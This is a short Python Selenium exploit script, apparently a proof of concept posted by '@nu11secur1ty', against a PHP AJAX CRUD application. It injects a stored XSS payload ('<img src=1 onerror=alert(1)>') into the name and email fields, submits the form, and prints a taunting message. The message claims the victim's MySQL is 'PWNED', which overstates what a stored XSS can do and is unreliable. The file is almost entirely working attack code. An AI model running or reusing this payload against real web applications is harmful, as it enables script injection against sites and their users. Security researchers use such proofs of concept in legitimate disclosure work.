#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-nu11-10

from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
from selenium.webdriver.chrome.options import Options
init(convert=True)

PHPCRUD="http://192.168.1.180/ajax_crud/"
browser = webdriver.Chrome()
browser.get((PHPCRUD))	
try:
	### 0
	browser.maximize_window()
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"dt-button btn btn-primary py-0\"]').click()")
	
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"first_name\"]').value = '</span><img src=1 onerror=alert(1) /><span>'")
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"last_name\"]').value = '</span><img src=1 onerror=alert(1) /><span>'")
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"email\"]').value = '</span><img src=1 onerror=alert(1) /><span>'")
	
	print(Fore.GREEN + 'Choice the calendar date and Press Enter to continue...\n')
	print(Style.RESET_ALL)
	input()
	time.sleep(5)
	# submit
	browser.execute_script("document.querySelector('[class=\"btn btn-primary\"]').click()")
	
	
	print(Fore.RED + 'The payload for CVE-nu11-10 is deployed and you are CRITICAL HACKED BY XSS STORED return error 1 ATTACK, your MySQL is PWNED\n')
	print(Style.RESET_ALL)
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")
